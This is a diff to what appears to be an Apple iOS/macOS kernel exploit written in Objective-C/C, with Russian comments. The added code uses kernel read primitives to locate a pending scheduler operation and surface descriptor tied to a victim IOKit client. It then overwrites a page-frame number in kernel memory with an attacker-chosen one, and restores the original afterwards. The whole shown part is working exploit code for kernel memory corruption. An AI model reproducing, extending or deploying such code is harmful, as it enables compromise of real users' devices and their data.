@@ -6778,6 +6778,48 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             if (!nSpec) kpNote(r, @"  [SPC] spec+0x58 с pfn32 нигде не найден");
         }
     }
+    // 1.9.231: OPC-EARLY — [OPC] после execute#1 не находил op (reaped из очередей
+    // за ~40с DEP-скана, op=0). Локатор СРАЗУ после submit: op pending, запись жива.
+    // Идём op-entry([op+0x48]==UC) → plane-struct → surf(sid=dstID) → desc →
+    // [desc+0x60] spec и ЗАПОМИНАЕМ АДРЕС (specOld=0-маркер: pfn ещё не заполнен).
+    // Патч — в retry (спек заполнен execute#1, rewriter перечитывает каждый execute).
+    {
+        uint64_t vcE = kpM2TClientVA(r, isTable, victim, @"opcE-victim");
+        uint64_t ucE = kpLooksLikeKernelPointer(vcE) ? kp_untag_ptr(early_kread64(vcE + 0x30)) : 0;
+        uint64_t provE = kpLooksLikeKernelPointer(ucE) ? kp_untag_ptr(early_kread64(ucE + 0xe8)) : 0;
+        uint64_t opE = 0;
+        if (kpLooksLikeKernelPointer(provE) && kpSafeToRead(provE)) {
+            uint64_t arraysE[2] = { kp_untag_ptr(early_kread64(provE + 0xc8)), kp_untag_ptr(early_kread64(provE + 0x110)) };
+            uint64_t countsE[2] = { early_kread64(provE + 0xb8), early_kread64(provE + 0x100) };
+            for (int ai = 0; ai < 2 && !opE; ai++) {
+                uint64_t arr = arraysE[ai];
+                uint64_t cnt = countsE[ai]; if (cnt > 256) cnt = 256;
+                if (!kpLooksLikeKernelPointer(arr)) continue;
+                for (uint64_t i = 0; i < cnt && !opE; i++) {
+                    uint64_t op = kp_untag_ptr(early_kread64(arr + i * 8));
+                    if (!kpLooksLikeKernelPointer(op) || !kpSafeToRead(op)) continue;
+                    if (kp_untag_ptr(early_kread64(op + 0x48)) == ucE) { opE = op; break; }
+                }
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [OPC-E] UC=%#llx prov=%#llx op=%#llx", (unsigned long long)ucE, (unsigned long long)provE, (unsigned long long)opE]);
+        if (opE) {
+            uint64_t psE[2] = { kp_untag_ptr(early_kread64(opE + 0x438)), kp_untag_ptr(early_kread64(opE + 0x6f8)) };
+            for (int pi = 0; pi < 2 && !nSpec; pi++) {
+                uint64_t ps = psE[pi];
+                if (!kpLooksLikeKernelPointer(ps) || !kpSafeToRead(ps)) continue;
+                uint64_t surf3 = kp_untag_ptr(early_kread64(ps + 0x90));
+                uint32_t sid3 = kpLooksLikeKernelPointer(surf3) ? (uint32_t)early_kread64(surf3 + 0x10) : 0;
+                if (sid3 != dstID) continue;
+                uint64_t pd3 = kp_untag_ptr(early_kread64(surf3 + 0x30));
+                uint64_t spec3 = (kpLooksLikeKernelPointer(pd3) && kpSafeToRead(pd3)) ? kp_untag_ptr(early_kread64(pd3 + 0x60)) : 0;
+                if (!kpLooksLikeKernelPointer(spec3) || !kpSafeToRead(spec3)) continue;
+                uint64_t len3 = early_kread64(spec3 + 0x08);
+                kpNote(r, [NSString stringWithFormat:@"  [OPC-E] ★ spec НАЙДЕН: %#llx (len=%#llx) — адрес записан, патч в retry", (unsigned long long)spec3, (unsigned long long)len3]);
+                specVA[nSpec] = spec3 + 0x58; specOld[nSpec] = 0; nSpec++;
+            }
+        }
+    }
     // 1.9.147: OP-ENTRY ОРАКУЛ — surfVA из самой оп-записи scheduler'а, без портов
     // и реестра. Submit (sel1) резолвит surface ptr в op-entry (раунд 24); нашу
     // запись находим по credit=0x10 (sel10 выше), сканируем 0x21c0 на указатели,
@@ -7173,7 +7215,11 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // только в окне execute, не секундами — урок prev-12).
     for (int attempt = 1; !changed && attempt < 4; attempt++) {
         for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], newQs[j]);
-        for (int k = 0; k < nSpec; k++) early_kwrite64(specVA[k], (specOld[k] & 0xffffffff00000000ULL) | ctlPFN);
+        for (int k = 0; k < nSpec; k++) {
+            uint64_t cur = early_kread64(specVA[k]);
+            if (!specOld[k]) specOld[k] = cur;   // 1.9.231: первый живой pfn как restore-оригинал (specOld=0 был маркером)
+            early_kwrite64(specVA[k], (cur & 0xffffffff00000000ULL) | ctlPFN);
+        }
         for (int i = 0; i < nDep; i++) {
             if (hitForm[i] < 0 || hitForm[i] == 4) continue;
             uint64_t nq = (hitForm[i] == 1) ? ((hitOld[i] & 0x3fffULL) | ctlPA)
@@ -7193,7 +7239,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         if (!changed) {
             for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], origQs[j]);
             for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
-            for (int k = 0; k < nSpec; k++) early_kwrite64(specVA[k], specOld[k]);
+            for (int k = 0; k < nSpec; k++) if (specOld[k]) early_kwrite64(specVA[k], specOld[k]);
         }
     }
     // restore всех пропатченных слотов (порт-маршрут или одиночный ranges)
@@ -7202,7 +7248,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // 1.9.219: финальный restore DEP-хитов ВСЕГДА (яд не живёт дольше теста)
     for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
     // 1.9.222: финальный restore spec (яд не живёт дольше теста)
-    if (!changed) for (int k = 0; k < nSpec; k++) early_kwrite64(specVA[k], specOld[k]);
+    if (!changed) for (int k = 0; k < nSpec; k++) if (specOld[k]) early_kwrite64(specVA[k], specOld[k]);
     // 1.9.198: restore VA-поля буфера (teardown-safety)
     if (vaFldObj) {
         early_kwrite64(vaFldObj + vaFldOff, vaFldOld);
